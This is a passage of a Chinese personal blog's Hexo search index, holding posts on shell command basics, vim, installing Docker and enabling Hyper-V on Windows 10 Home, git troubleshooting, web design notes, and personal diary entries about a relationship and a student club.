在lagacy模式是进不了的， 因为…bios不知道咋办了， 找不到UEFI]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>UEFI</tag>
        <tag>legacy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell脚本]]></title>
    <url>%2F2018%2F12%2F15%2Fshell%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[shell命令复习 ls命令， -l是以详细模式列出文件夹的内容，-a是列出所有内容，包括.开头的文件(all), lsbls命令，列出块设备,以标准的的树状格式输出，-l是以列表格式输出显示块设备(lsblk， 可以用来了解新插入的usb设备的名字) md5sum，就是计算和检验MD5信息签名 uname命令，就是unix name命令的缩写，显示机器名和操作系统，内核的详细信息，-a显示详细信息(all) history命令就是列出历史纪录 touch创建文件，或者修改已存在的文件的上一次修改时间 chmod和chown命令 cal显示日历和date ps命令给出正在运行的某个进程的状态， -A列出所有的进程及其PID ps -A | grep -i apache2 servive启动某个服务 以上是一些常用的命令，下面是一些命令常见的用法 查找命令find.代表当前目录， find . -print, 其中print0可以指明使用’\0’作为定界符 -name 制定了文件名所必须匹配的字符串 -iname 忽视大小写 find . \(-name “.txt” -o -name “\.pdf”\) -print find . -regex “.*(\.py | \.sh\) $ “ -type 指定搜索的类型，其中d是目录， f是普通文件， l是符号链接 -atime 用户最近一次访问的时间， -mtime文件内容最后一次被修改时间 ， -ctime 文件元数据最后一次被修改的时间 +7 代表访问时间超过七天的 7代表访问时间正好是七天， -7代表最近七天内被访问过的所有文件 同样的还可以用-amin, -mmin, -cmin 分钟做计量单位 -size 表示文件大小 w k M G 字 千 兆 吉 -perm 表示权限 -exec ，实例： 1234find . -type f -user root -exec chown XXXX &#123;&#125;\;find . -type f -name &quot;*.c&quot; -exec cat &#123;&#125;\; &gt; all_c_files.txtfind . -type f -mtime +10 -name &quot;*.txt&quot; -exec cp &#123;&#125; OLD \;find . -type f -name &quot;*.txt&quot; -exec printf &quot;The file : %s\n&quot; &#123;&#125;\; 玩转xargscat example.txt | xargs 将单行输入转化为多行 cat example.txt | xargs -n 3 结合fing使用xargs find . -type f -name “,txt” -print0 | xargs -0 rm -ffind dir -type f -name “.c” -print0 | xargs -0 wc -l tr命令tr ‘A-Z’ ‘a-z’ tr -d ‘[set1]’ 指定被删除的字符集合 12echo &quot;hello 1 char 2 next 4 | tr -d -c &apos;0-9&apos; \n&apos;tr -s &apos; &apos;压缩输入中重复的空白字符 wget和cURLwget URL1 URL2 URL3 -t 用来指定重复次数 —limit-rate限速 —quota或-Q 指定最大下载配额 -c断点续传 -O指定下载到的文件名 -o将输出写入日志文件 cURL URL —silent cURL不会讲下载的写入文件，而是写入标准输出 -O将下载到的内容写入到下载文件 -o写入指定名称的文件中 -C断点续传]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[假如生活能像vim一样]]></title>
    <url>%2F2018%2F12%2F15%2F%E5%81%87%E5%A6%82%E7%94%9F%E6%B4%BB%E8%83%BD%E5%83%8Fvim%E4%B8%80%E6%A0%B7%2F</url>
    <content type="text"><![CDATA[假如生活能像vim一样复习一下vim中的快捷键emmm这个其实我自己也不太想总结，直接搬别人的东西吧 关于vim的思想vim好用吗，我觉得确实比Windows自带的记事本要好多了。但是如果用来做开发环境，其实并不见得就一定特别好。不过我倒是很喜欢这个编辑器，以前一直觉得它很神秘，尤其是我第一次打开这个编辑器，然后只看到一堆的波浪线的时候，就觉得。。。这他妈是个什么玩意儿.连输入东西都输不进去。其实吧，这也是vim的哲学了，不要着急着输入，先好好看看，构思一下从哪里输入，当你每次操作完之后，是不是该停下来思考一下，就像画家把笔放一下，vim的普通模式也正是如此。 vim中的好多操作我觉得都特别好，dd删除一行的快感，G直接跳到文末，daw直接删除一个单词而不是要先高亮之后再去删除，/开始搜索文本，不需要每次同时按下ctrl+f， w和b在单词之间跳来跳去，不需要每次按着ctrl然后同时按方向键，A直接在行末添加，I直接在行首添加，还有dt.删除直到某个字符，这简直就是在写作文鸭23333.这些动作确实很精简，也很有效，当然，如果你喜欢了GUI，习惯了在word里面用鼠标不断地搜索你要替换的文本然后高亮（我觉得我会疯掉了去），vim对你来说当然不又好了，因为它甚至不允许你用鼠标，连最简单的方向键盘，都可以直接用hjkl四个键来替代。vim确实很好玩，但是目前来说，至少不太适合我写C语言。 vim的小技巧？ 我们知道每次安装新的Linux操作系统的时候，一般都是需要去修改镜像源的，vim /etc/apt/source.list，然后复制粘贴你从网上弄下来的镜像源，当然对于曾今小白的我来说，我是一个个敲上去的…..我不知道虚拟机和主机是不是共用一个剪切板，不过我知道如果用ssh连接bash之后，是可以粘贴的。首先你需要删除原来所有的内容，或者选择注释掉，这个操作emmmm，以后再来填坑，然后粘贴，或者另起一行啥的。。。哎呀有点乱，我先歇会。]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[折腾docker的那些事儿]]></title>
    <url>%2F2018%2F12%2F12%2F%E6%8A%98%E8%85%BEdocker%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[关于docker其实我也不知道docker是干嘛的，不过听说它很强大，所以试着玩一玩呗。 下载docker菜鸟教程 通过docker-toolbox来安装下载地址 Docker CLI 客户端，用来运行docker引擎创建镜像和容器Docker Machine. 可以让你在windows的命令行中运行docker引擎命令Docker Compose. 用来运行docker-compose命令Kitematic. 这是Docker的GUI版本Docker QuickStart shell. 这是一个已经配置好Docker的命令行环境Oracle VM Virtualbox. 虚拟机然后我的电脑里面就塞满了这些东西 刚下载之后，桌面上确实会有三个图标，但是Windows好像找不到，所以自己手动去目录里面翻了一下。 无他，shift加右键打开start.sh脚本，不过Windows命令行是没办法运行这个脚本的，所有它会默认用git bash打开。(突然发现git是不是就相当于一个Linux的bash？好多命令都可以用，那我不是可以通过它来管理我的电脑？这个坑之后再去补上) 会经过一段时间的等待， 通过提示信息可以看到它正在进行默认的配置。 之后会打开virtual box，可以看到正在分配IP地址。 我这里貌似尝试了一次之后失败了，所以接着又尝试了一下， 成功了！！！ 之后尝试了第一个命令： docker run hello-world 可以看到docker先在本地查找hello-world的镜像，没找到，然后去一个hub里面检查并下载， 这就是docker入门的开始啦！ 12月12日晚上 运行docker命令总是报错,如下： E:\ProgramFiles\Docker Toolbox\docker.exe: error during connect: Post https://192.168.99.100:2376/v1.37/containers/create: dial tcp 192.168.99.100:2376: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.See ‘E:\ProgramFiles\Docker Toolbox\docker.exe run —help’. 根据报错提示，可能是超时了，没有接收到响应。 另外记个笔记: docker运行的时候，是有一个虚拟机开着的，这就是为啥安装Docker Toolbox的时候需要同时安装virtual box了。 所以重启电脑之后，需要手动开启虚拟机。 阿里镜像 win10安装docker docker文档 docker documentation toolbox 之前说过win10安装docker有两种方式，但是win190更加推荐docker for Windows。 但是这个功能必须要求电脑开启了了hyper-v服务(应该就是win10自带的创建虚拟机的服务) 第一部当然是看一下处理器支不支持了，命令行下输入systeminfo 然而，如果是win10家庭版，默认是没有显示hyper-v服务的。 家庭版添加hyper-v123456789pushd &quot;%~dp0&quot;dir /b %SystemRoot%\servicing\Packages\*Hyper-V*.mum &gt;hyper-v.txtfor /f %%i in (&apos;findstr /i . hyper-v.txt 2^&gt;nul&apos;) do dism /online /norestart /add-package:&quot;%SystemRoot%\servicing\Packages\%%i&quot;del hyper-v.txtDism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL 就是运行一个批处理程序。 然后我们就能愉快的找到hyper-v服务啦。]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[200天啦]]></title>
    <url>%2F2018%2F12%2F11%2F200%E5%A4%A9%E5%95%A6%2F</url>
    <content type="text"><![CDATA[200天啦 我和我最爱的宝宝在一起已经200天啦！！！ 还记得懵懂的6月，情窦初开的我们牵手了。在你我的扶持下，携手走过了期末考试的旅程，又经过了暑假漫长的思念，到如今掐指，200个日夜已经流过。 虽然表面上嫌弃你这只zz，但是我怎么舍得丢下你呢，都是因为我，曾经那么聪慧的xjy变得这么zz了，我如果不好好惯着你，今后的日子你又该怎么过呢。 宝宝，虽然我会生你的气，但是我在生气的时候也是爱着你的鸭，如果哪一天我们之间再也没有争吵，那才不正常呢，那只能说明我们俩的心都已经死了。 宝宝，对不起呀，今天是我激动了一点。原本200天的纪念日应该给你惊喜的，可是却让你落泪了。都是你的zz的错嘛。唉，你的zz有时候太敏感了，虽然知道你的话没有恶意，可是还是忍不住往别的方向想，因为我童年的时候受到过太多的欺凌了，所以很容易将一句话误解成伤害我的话。 但是我可能防范地过度了，我不该对我的宝宝那么认真的(大哭.jpg)，宝宝是我最爱的人，又怎么会伤害我呢。 最爱我的宝宝，不管她zz也好，不过机智点就更好啦。 谨以此作为我们200天纪念日的祝福]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[git 进阶]]></title>
    <url>%2F2018%2F12%2F11%2Fgit-%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[git tql!!!最全的git教程 git可以很方便地解决多人协作写代码的问题，同时还可以有效地管理你的文件 git reset --hard命令可以修改你的工作取得状态，包括将删除的文件重新找回。 (今天动手做实验的时候才发现的，值得收藏) git 可以很方便地多人同时开发，就好像其他人不存在一样，最后只需要合并每个人的分支即可 注意一下 git branch 是创建一个分支，不过你需要知道自己是在哪个分支的基础上创建的分支，(git 好像没有可以显示分支的相对位置的命令?这个坑稍后再去补充) 合并分支 你想要把哪个分支合并到另一个分支上，你就需要在那个分支上工作，同时使用 git merge命令 分支冲突 emmmm分支冲突这种事先放着，以后遇到了坑之后再解决]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[申请pycharm专业版]]></title>
    <url>%2F2018%2F12%2F10%2F%E7%94%B3%E8%AF%B7pycharm%E4%B8%93%E4%B8%9A%E7%89%88%2F</url>
    <content type="text"><![CDATA[发现自己的pycharm和别人的博客里面的不一样，百度之后发现pycharm分为几个版本 如何申请专业版 申请专业版 武大邮箱2017301510012@whu.edu.cn 使用武大的邮箱可以申请！！！ 我的license 从此可以用上pycham的专业版了，开森。]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
      <tags>
        <tag>pycharm专业版</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[折腾git的那些事儿]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%8A%98%E8%85%BEgit%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[git是一个很强大的工具 最基本的命令，包括 git init 初始化一个git仓库 git status查看当前的状态 git add将本地仓库中的内容添加到暂存区 git commit将本地仓库(emmmm)好像还没弄明白 git clone克隆一个仓库 git push将本地上传到远程仓库 以往我都是直接新建一个仓库，然后git remote add origin这个仓库的 但是这次我忘记本地与远程那个连接的仓库放在电脑哪个位置了。 所以我直接git init了一个，然后就git remote add origin了一个现有的远程仓库 悲剧来了 当我git push的时候，报错了！！！ 123456error: failed to push some refs to &apos;git@github.com:xinyongpeng/Data.git&apos;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &apos;git pull ...&apos;) before pushing again.hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details. 参考这篇文章 解决步骤： git clone git@github.com:xinyongpeng/Data.git 是不行的，会报错 git pull --rebase origin master先运行这个命令 提示如下： 123456789101112Enter passphrase for key &apos;/c/Users/zz/.ssh/id_rsa&apos;:warning: no common commitsremote: Enumerating objects: 22, done.remote: Counting objects: 100% (22/22), done.remote: Compressing objects: 100% (16/16), done.remote: Total 22 (delta 4), reused 21 (delta 3), pack-reused 0Unpacking objects: 100% (22/22), done.From github.com:xinyongpeng/Data * branch master -&gt; FETCH_HEAD * [new branch] master -&gt; origin/masterFirst, rewinding head to replay your work on top of it...Applying: 贝贝的代码 之后再git push origin master就行了 原理不是太明白，先解决问题吧 2019年 2月4日更新 详解git fetch与git pull 的区别 这两个命令都能将远端仓库更新至本地， 但是却有些区别 主要区别如下： git fetch： 从远程获取最新版本到本地， 但不会自动merge git pull： 是git fetch 与 git merge 两个步骤的结合 如果需要有选择的合并， git fetch 是最好的选择 如果没有这个需要， git pull 是最快的 所以如果不是在原来的那个文件夹(即最初的与远程仓库连接的文件夹)， 想要直接git push当然会报错 必须把远端仓库拿下来， 做一次git merge， 这样才能推送到远程仓库 一个可视化的git项目]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习部 加油！]]></title>
    <url>%2F2018%2F12%2F08%2F%E5%AD%A6%E4%B9%A0%E9%83%A8-%E5%8A%A0%E6%B2%B9%EF%BC%81%2F</url>
    <content type="text"><![CDATA[12月8日，元旦晚会和部门聚餐 好兴奋呀，这一次的部门节目很成功。当我在台上演戏的时候，听到台下传来一阵阵的笑声，心里着实是激动呀，毕竟我们努力了那么久，观众的笑声就是对我们最大的回馈。 当然也要感谢我们的婌婌，当初让她当节目负责人的时候还只是我草率的决定，没想到竟让平时言辞比较少的婌婌变得那么活跃，婌婌真的好棒，有这样一个部委让我好骄傲呀。当然还有我们的广哥，无私的牺牲自己，穿上了女装，哈哈哈，抽风的七九。 哈哈哈我就不想放图了，不想让我的博客变得那么不正经。 虽然我也很不情愿地女装了，不过还是不太到位，虽然口红涂得的比较艳丽，最有趣的是表演完出来之后还遇见了炳哥和郝宇涵，看郝宇涵那个表情，简直了，还有炳哥都直接拿起手机准备拍照了哈哈哈。 还忘了在进去的时候看见了我的熊哥哥，和他打招呼的时候，也把他给吓着了，然后很淡定地说了一句，“你好骚啊” 平生第一次女装，不过还是比不过体育部的全员女装了，看的我触目心惊，全员女装，假发，黑丝。太震惊了 之后就是愉快的聚餐环节啦。 不得不说，学习部真的是一个很温馨的大家庭呢。 婌婌，搏鸿和皮皮是之后才来的，搏鸿和皮皮点好餐之后，给婌婌点餐的时候，婌婌不乐意了，“你们俩孤立我，哼”结果两个男生没办法只好重新点餐，婌婌还一脸正经的威胁到“你们俩点餐，必须是三个人吃的份，不然就是孤立我”惹得我们吃完饭的哈哈大笑。 之后呢，又是精彩的狼人杀呀，慧玲妹妹说，自从第一次聚餐玩狼人杀之后就再也没玩了，不过一玩起来，大家从开始的不大会玩，到现在一个比一个精。婌婌还说，我发现跳预言家真好玩，结果第二把的时候她跳了预言家，接着果断地给我发了金水。可是没想到她是个坏人，叶皮皮却是好人，所以叶皮皮在验证了婌婌的身份之后，果断号召大家把我也票走了。我还能说啥呢嘤嘤嘤。 从上面的图中显而易见地看出，婌婌当初刚来学习部的时候还不是那么活泼，现在经过一场元旦晚会之后的历练，已经变得越来越善于与人交往了。今天她也显得格外的活跃呀，没有再像往常一样盯着手机，而是时而开个玩笑，时而做一个表情，或者发出一声怪叫。哈，我的部委们越来越优秀了呀。 有这样一个优秀，温馨的大家庭，让我感到很兴奋呀，想当初这些人都是我一手拉进来的，现在看来除了ycx和zjz有点分散之外，其他人都融入了这个大家庭。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>学习部</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零杯网页设计]]></title>
    <url>%2F2018%2F12%2F08%2F%E9%9B%B6%E6%9D%AF%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[网页设计是个坑 11月份入坑网页设计，然后就被折磨的死去活来，不过万幸还是提交了作品，还勉强进了决赛。 响应式网页设计主流框架:bootstrap bootstrap框架确实很好用，包括响应式导航栏的设计，排版，轮播图(不过目前我好像也只会用这些) 不过最然人头疼的还是网格系统，先记在小本本上，暂时还没弄明白 先说说我入坑网页设计的吧 一个之前没有任何前端开发经验的，想要设计网页，其实也不算是一件难事，因为我看的懂html语言呀，有很多标记的用法是可以直接参考的，这里先对比一下菜鸟和w3c吧，菜鸟教程确实很良心，先放两个链接： bootstrap教程 bootstrap可视化布局系统 可视化布局系统可以直接托托拽拽，一个简单的网页结构就出来了 不过短短的时间内让我直接写那么多的css和js文件确实不太可能，所以我们去网上参考了几个模板，不过网站好像忘了，因为网上的模板实在是太多了 这里真的很感谢我的宝宝，是她在我最忙的时候，独自一人熬夜选择素材，本来对网页设计完全不入门的她而言，最多简单地知道开发者工具怎么使用，那几天，她一直在修图，去网上找素材和文字。等我闲下来的时候，她已经将一个大体成型的网页摆在我面前了。我真的好想抱住她，然后给她一个吻。由于她前期的努力，后期我只是简单地对网页的布局进行了一定的修改，包括最后的文档的完成。 网页设计的经验总结 css的各个属性之间是有优先级的,有以下几种插入css的方式 通过id和class选择器，通过标签选择器&lt;style&gt;h3{color:red}&lt;/style&gt;,第四种就是直接在标签内部书写css代码(这是最不推荐的方式)&lt;h3 style =&quot;color:red&quot;&gt;&lt;/h3&gt; 以上几种优先级为：第四种 &gt; id 选择器&gt; class选择器 &gt; 第三种 css还有一种包含的选择器， 指定目标选择器必须处在某个选择器对应的元素内部，语法格式：A B{...} A、B为HTML元素/标签，表示对处于A中的B标签有效]]></content>
      <categories>
        <category>网页设计</category>
      </categories>
      <tags>
        <tag>网页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[next主题优化]]></title>
    <url>%2F2018%2F12%2F07%2Fnext%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[next主题添加背景音乐 主要参考这篇博客next主题添加网页音乐播放器功能 这篇博客给出的方法貌似有些不一样给next博客添加主题音乐 当腾讯推出QQ空间这个功能的时候，确实迎合了大多数人的需求，那就是在茫茫的网络世界里面，有一个自己的温馨小家。如果是自己的小窝，当让更舍得花钱啦，腾讯因此推出的黄钻，绿钻功能让它赚的盆满钵满。这一次腾讯不是逼着用户交钱，而是用户心甘情愿的掏钱。不得不惊叹其营销手段的高明，百合网也是如此，它的创始人，网名小龙女，在做这件事的时候压根没想到怎么挣钱，但是有慧眼的投资人却相信她一定有将流量变现的妙招。后来，小龙女从写情书这一点想到，可以通过对虚拟邮票进行收费，鼓励男女之间相互写情书。我第一次看到这的时候，确实惊叹于小龙女的奇思妙想。如此既有文化内涵，又能让用户心甘情愿地掏钱的好点子可真是不容易想到。 商业中其实有很多与此类似的故事，在慢慢地丰富自己阅历的同时，也不断开拓者自己的思路。 next主题优化 主要参考以下几篇文章 Hexo-Next主题优化(三) Hexo_Next主题优化(二)]]></content>
      <categories>
        <category>瞎折腾</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[some tips]]></title>
    <url>%2F2018%2F12%2F06%2Fsome-tips%2F</url>
    <content type="text"><![CDATA[写给想要搭建博客的人 这是一些tips 好好学习markdown语法，博客一般都是用markdown写的 域名买下来之后，需要实名认证，需要配置好解析 配置解析可以参考github怎么绑定自己的域名 如果是先用GitHub建好了网站，后期如果想更改域名的，留意一下原来的仓库里面有没有CNAME文件 新买来的域名一般是需要十分钟左右才能正常解析的，心里不要太着急 用hexo搭建博客，hexo只需要掌握四条最常见的命令 本地修改好之后，在本地预览是很迅速的，但是通过GitHub提交之后会有延迟的，不要太心急 如果真的很想拥有一个博客，不要半途而废，也不要过于急躁]]></content>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
</search>
